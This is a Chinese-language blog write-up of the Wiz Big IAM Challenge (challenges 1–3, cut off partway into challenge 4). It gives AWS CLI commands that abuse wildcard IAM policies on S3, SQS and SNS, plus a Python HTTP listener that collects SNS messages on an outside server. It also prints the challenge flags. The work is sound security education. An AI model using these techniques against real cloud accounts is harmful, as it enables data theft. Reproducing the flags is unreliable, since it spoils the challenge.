<!doctype html><html lang=en><head><title>Wiz Big Iam Challenge :: en1r0py</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=/posts/2024/wiz-big-iam-challenge/><link rel=stylesheet href=/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css><link rel=stylesheet href=/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css><link rel=stylesheet href=/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css><link rel=stylesheet href=/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css><link rel=stylesheet href=/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css><link rel=stylesheet href=/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css><link rel=stylesheet href=/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css><link rel=stylesheet href=/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css><link rel=stylesheet href=/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css><link rel=stylesheet href=/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css><link rel=stylesheet href=/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css><link rel=stylesheet href=/css/terminal.min.dd0bf9c7cacb24c1b0184f52f1869b274e06689557468cc7030ccf632328eb97.css><link rel=stylesheet href=/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel="shortcut icon" href=/favicon.png><link rel=apple-touch-icon href=/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Wiz Big Iam Challenge"><meta property="og:description" content><meta property="og:url" content="/posts/2024/wiz-big-iam-challenge/"><meta property="og:site_name" content="en1r0py"><meta property="og:image" content="/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2024-08-31 13:08:52 +0800 +0800"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://en1r0py1865.github.io/><div class=logo>en1r0py1865</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=/posts/2024/wiz-big-iam-challenge/>Wiz Big Iam Challenge</a></h1><div class=post-meta><time class=post-date>2024-08-31</time></div><div class=post-content><div><h2 id=challenge-1-buckets-of-fun>Challenge 1: Buckets of Fun<a href=#challenge-1-buckets-of-fun class=hanchor arialabel=Anchor>#</a></h2><h3 id=解题>解题<a href=#解题 class=hanchor arialabel=Anchor>#</a></h3><p>查看View IAM Policys</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Version&#34;: </span><span style=color:#e6db74>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Statement&#34;: </span>[
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Principal&#34;: </span><span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span><span style=color:#e6db74>&#34;s3:GetObject&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span><span style=color:#e6db74>&#34;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Principal&#34;: </span><span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span><span style=color:#e6db74>&#34;s3:ListBucket&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span><span style=color:#e6db74>&#34;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Condition&#34;: </span>{
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;StringLike&#34;: </span>{
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;s3:prefix&#34;: </span><span style=color:#e6db74>&#34;files/*&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个策略包含两个声明：</p><ol><li>第一个声明允许所有用户对存储桶 thebigiamchallenge-storage-9979f4b 中的所有对象执行 s3:GetObject 操作。</li><li>第二个声明允许所有用户对存储桶 thebigiamchallenge-storage-9979f4b 执行 s3:ListBucket 操作，但仅限于前缀为 files/ 的对象。</li></ol><p>列出指定 S3 存储桶中的全部对象</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws s3api list-objects-v2 --bucket thebigiamchallenge-storage-9979f4b
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Contents&#34;</span>: <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;files/flag1.txt&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2023-06-05T19:13:53.000Z&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;ee004573d2858ed66abf17d58d350b97\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Size&#34;</span>: 37,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Key&#34;</span>: <span style=color:#e6db74>&#34;files/logo.png&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;LastModified&#34;</span>: <span style=color:#e6db74>&#34;2023-06-08T19:18:24.000Z&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;ETag&#34;</span>: <span style=color:#e6db74>&#34;\&#34;c57e95e6d6c138818bf38daac6216356\&#34;&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Size&#34;</span>: 81889,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;StorageClass&#34;</span>: <span style=color:#e6db74>&#34;STANDARD&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>通过将文件内容输出至stdout中获得flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>wiz:exposed-storage-risky-as-usual<span style=color:#f92672>}</span>
</span></span></code></pre></div><h3 id=思考>思考<a href=#思考 class=hanchor arialabel=Anchor>#</a></h3><p>该策略的设置对于用户权限过于宽泛，是一种常见且不够严谨的配置方式。</p><h2 id=challenge-2-google-analytics>Challenge 2: <del>Google</del> Analytics<a href=#challenge-2-google-analytics class=hanchor arialabel=Anchor>#</a></h2><h3 id=解题-1>解题<a href=#解题-1 class=hanchor arialabel=Anchor>#</a></h3><p>查看View IAM Policys</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Version&#34;: </span><span style=color:#e6db74>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Statement&#34;: </span>[
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Principal&#34;: </span><span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span>[
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;sqs:SendMessage&#34;</span>,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;sqs:ReceiveMessage&#34;</span>
</span></span><span style=display:flex><span>            ],
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span><span style=color:#e6db74>&#34;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&#34;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个策略包含一个声明，允许所有用户对指定的 SQS 队列执行发送消息 (sqs:SendMessage)、接收消息 (sqs:ReceiveMessage)操作：</p><p>执行接收消息操作</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Messages&#34;</span>: <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;MessageId&#34;</span>: <span style=color:#e6db74>&#34;3f8a25dd-868d-4f86-af00-4f21739d2100&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;ReceiptHandle&#34;</span>: <span style=color:#e6db74>&#34;AQEBECzaPPWrRTu0F/n2VYwTkW/iwwk2hBrVviXIafMb5T5uO7fQaPQb/RStX7R3p/aPBjvZqWAWwxtsWnBoBxSvWECsYVr88XLr0ceD5WaY47CAUUM1APqoJP304E9WhXCgXx0vTysWJR7srn
</span></span></span><span style=display:flex><span><span style=color:#e6db74>ooL2xApHvLhO1+8IpDVJgI2GYrGu+7SNdrIHx2tTpQ726tbPlXOMgsND+Cn02Gta7LyNGT33Wvy2NVjf1srTmmCNq1A+rl2qtkz0Eo/c45ZgTuOJNir0xK122zMpoUIIS62rVKFatLbDhr0HnjXUFFFDyImtI3V3glSU5I7KRlvTsTUf
</span></span></span><span style=display:flex><span><span style=color:#e6db74>TMWA47MdPwypVZzQQe5GS0eI0wP+wJiR3iNehKORdrMvpaJfeLZuhKyEIG2jILHlK383G4m8Yntsq+uRV6/i2/tEU06fcH0nalJ8qaIzd9GPs=&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;MD5OfBody&#34;</span>: <span style=color:#e6db74>&#34;4cb94e2bb71dbd5de6372f7eaea5c3fd&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;Body&#34;</span>: <span style=color:#e6db74>&#34;{\&#34;URL\&#34;: \&#34;https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\&#34;, \&#34;User-Agent\&#34;: \&#34;Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM
</span></span></span><span style=display:flex><span><span style=color:#e6db74>/1.4.3714\&#34;, \&#34;IsAdmin\&#34;: true}&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>访问Body字段内容的URL(<a href=https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html>https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html</a>)，即可获得flag</p><h3 id=思考-1>思考<a href=#思考-1 class=hanchor arialabel=Anchor>#</a></h3><p>该策略的设置对于用户权限过于宽泛，且SQS队列内包含敏感信息的载体。</p><h2 id=challenge-3-enable-push-notifications>Challenge 3: Enable Push Notifications<a href=#challenge-3-enable-push-notifications class=hanchor arialabel=Anchor>#</a></h2><h3 id=解题-2>解题<a href=#解题-2 class=hanchor arialabel=Anchor>#</a></h3><p>查看View IAM Policys</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Version&#34;: </span><span style=color:#e6db74>&#34;2008-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Id&#34;: </span><span style=color:#e6db74>&#34;Statement1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Statement&#34;: </span>[
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Sid&#34;: </span><span style=color:#e6db74>&#34;Statement1&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Principal&#34;: </span>{
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;AWS&#34;: </span><span style=color:#e6db74>&#34;*&#34;</span>
</span></span><span style=display:flex><span>            },
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span><span style=color:#e6db74>&#34;SNS:Subscribe&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span><span style=color:#e6db74>&#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Condition&#34;: </span>{
</span></span><span style=display:flex><span>                <span style=color:#f92672>&#34;StringLike&#34;: </span>{
</span></span><span style=display:flex><span>                    <span style=color:#f92672>&#34;sns:Endpoint&#34;: </span><span style=color:#e6db74>&#34;*@tbic.wiz.io&#34;</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这个策略包含一个声明，允许所有 AWS 账户对指定的 SNS 主题执行订阅(SNS:Subscribe)操作，但仅限于符合特定条件(*@tbic.wiz.io)的终端节点(参考 <a href=https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_elements_condition_operators.html>AWS Doc</a>)
根据<a href=https://docs.aws.amazon.com/zh_cn/sns/latest/dg/sns-create-subscribe-endpoint-to-topic.html>AWS Doc</a>，SNS 终端节点支持多种类型。在这种情况下，可以使用 HTTP/HTTPS 进行条件绕过。</p><p>在具有公网的服务器上使用python3 http.server 建立一个 HTTP 服务器来监听@tbic.wiz.io请求路径，并且存储为custom_server.py</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> http.server
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socketserver
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib.parse
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>40001</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CustomHandler</span>(http<span style=color:#f92672>.</span>server<span style=color:#f92672>.</span>SimpleHTTPRequestHandler):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_POST</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>path <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/@tbic.wiz.io&#39;</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># 获取并打印请求内容</span>
</span></span><span style=display:flex><span>            content_length <span style=color:#f92672>=</span> int(self<span style=color:#f92672>.</span>headers[<span style=color:#e6db74>&#39;Content-Length&#39;</span>])
</span></span><span style=display:flex><span>            post_data <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>rfile<span style=color:#f92672>.</span>read(content_length)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Body: </span><span style=color:#e6db74>{</span>post_data<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            
</span></span><span style=display:flex><span>            <span style=color:#75715e># 发送响应</span>
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#34;Content-type&#34;</span>, <span style=color:#e6db74>&#34;text/html&#34;</span>)
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;POST request received!&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>404</span>)
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;404 Not Found&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> socketserver<span style=color:#f92672>.</span>TCPServer((<span style=color:#e6db74>&#34;&#34;</span>, PORT), CustomHandler) <span style=color:#66d9ef>as</span> httpd:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Serving at port </span><span style=color:#e6db74>{</span>PORT<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    httpd<span style=color:#f92672>.</span>serve_forever()
</span></span></code></pre></div><p>在具有公网的服务器上建立HTTP 服务器</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python3 custom_server.py
</span></span></code></pre></div><p>回到wiz提供的aws cli，执行发送订阅请求</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://&lt;公网IP&gt;:40001/@tbic.wiz.io
</span></span></code></pre></div><p>HTTP 服务器将接收到sns服务的订阅确认通知</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Body:</span> {
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Type&#34;</span> : <span style=color:#e6db74>&#34;SubscriptionConfirmation&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;MessageId&#34;</span> : <span style=color:#e6db74>&#34;3d983eb2-8a8e-4614-b795-3f01692f723f&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Token&#34;</span> : <span style=color:#e6db74>&#34;2336412f37fb687f5d51e6e2425ba1f259d6d4f96ad658d77066b1894033b23fcf59f464f708a4ef0dc15d9aa6e96007f71889162b85d711d391dd65dbc4225c5ad392b742ef34885791d035d8bb324f390ec9e5526351fc90bd8846c7c9a59522d3f4d2aae89ba10a1062e3936ceabdf0e8c61df5cf7bfc619cabe8a61b5f2b&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;TopicArn&#34;</span> : <span style=color:#e6db74>&#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Message&#34;</span> : <span style=color:#e6db74>&#34;You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;SubscribeURL&#34;</span> : <span style=color:#e6db74>&#34;https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f259d6d4f96ad658d77066b1894033b23fcf59f464f708a4ef0dc15d9aa6e96007f71889162b85d711d391dd65dbc4225c5ad392b742ef34885791d035d8bb324f390ec9e5526351fc90bd8846c7c9a59522d3f4d2aae89ba10a1062e3936ceabdf0e8c61df5cf7bfc619cabe8a61b5f2b&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Timestamp&#34;</span> : <span style=color:#e6db74>&#34;2024-08-31T16:29:00.462Z&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;SignatureVersion&#34;</span> : <span style=color:#e6db74>&#34;1&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Signature&#34;</span> : <span style=color:#e6db74>&#34;UIuJmvf4gxkVCoIj5rdsWQd9FE7IYTTM/dyVKnOiSBTBTf8DiaEm7Ric1QutD9QkLTpIO51uwmooQfMPE5bqpjPPyxh/bT1iR1zwu570VDTvnUD27/f6Ydzs3Z7G6pYAa4bwItsRzi26AZ5DmQs2J4dTjhWKXjLZbVlOMh+DDtzkFHT6kLRu1Ur2HUdXQN+BGky52BqJy1l1eGw2BueXPo155P/IHpGGQNB12p3doSeroKayt25KjEqc4CVgWbMltXpkCUQop8ek9fJE2427sLYESJqKC5nmSzb9NxFJNvZN744GgBemTUYmPACBcc677+eps1D/vNw9gKduoKwNXg==&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;SigningCertURL&#34;</span> : <span style=color:#e6db74>&#34;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>将上述Body中的Token替换下述的后发送确认订阅的命令</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --token &lt;Token&gt;
</span></span></code></pre></div><p>HTTP 服务器将持续接收到sns服务消息，内容包含flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Body:</span> {
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Type&#34;</span> : <span style=color:#e6db74>&#34;Notification&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;MessageId&#34;</span> : <span style=color:#e6db74>&#34;f8823847-feb3-52a4-b7f9-670ab783fc6d&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;TopicArn&#34;</span> : <span style=color:#e6db74>&#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Message&#34;</span> : <span style=color:#e6db74>&#34;{wiz:always-suspect-asterisks}&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Timestamp&#34;</span> : <span style=color:#e6db74>&#34;2024-08-31T16:38:08.443Z&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;SignatureVersion&#34;</span> : <span style=color:#e6db74>&#34;1&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;Signature&#34;</span> : <span style=color:#e6db74>&#34;gPvG0m3pZl8cD5vMVLflZ1xkKbCdXib2vQr70qkpWL30ChVNE4oiD2L5I3F/8jxEPbtd+sji5aGl7diSJAXbkR780SemEA54VT+k/doRNsX8tthFnI7ergaLebggi00/maER3oELRL9HQLYeQl4H9n+E+DxZCD+YPl6eIcpnAElqVLoFo0w+bLgd/RWy1DzzwtRpygRgeN6e98WGS4aqqOVrCXfi7p/wXt3UH1OSSMxs/uekjPyElF8ywzsmq8y1j3RgifuZdDsHtgVSYKsdy8sypvnTG04cz3lCmX6XNQKp2FzN/jtasmiuTrn1gwm3FqXUYj65HYn20FPga8BcZA==&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;SigningCertURL&#34;</span> : <span style=color:#e6db74>&#34;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;UnsubscribeURL&#34;</span> : <span style=color:#e6db74>&#34;https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&amp;SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:dbd2a329-edde-43e1-88ea-19ceadc436b6&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=思考-2>思考<a href=#思考-2 class=hanchor arialabel=Anchor>#</a></h3><p>尽管此策略使用了 <code>StringLike</code> 条件对订阅的终端节点进行了限制，但仅考虑了电子邮件终端的情况，存在被绕过的风险。</p><h2 id=challenge-4-admin-only>Challenge 4: Admin only?<a href=#challenge-4-admin-only class=hanchor arialabel=Anchor>#</a></h2><h3 id=解题-3>解题<a href=#解题-3 class=hanchor arialabel=Anchor>#</a></h3><p>查看View IAM Policys</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Version&#34;: </span><span style=color:#e6db74>&#34;2012-10-17&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;Statement&#34;: </span>[
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Principal&#34;: </span><span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span><span style=color:#e6db74>&#34;s3:GetObject&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Resource&#34;: </span><span style=color:#e6db74>&#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&#34;</span>
</span></span><span style=display:flex><span>        },
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Effect&#34;: </span><span style=color:#e6db74>&#34;Allow&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Principal&#34;: </span><span style=color:#e6db74>&#34;*&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#f92672>&#34;Action&#34;: </span><span style=color:#e6db74>&#34;s3:ListBucket&#34;</span>,
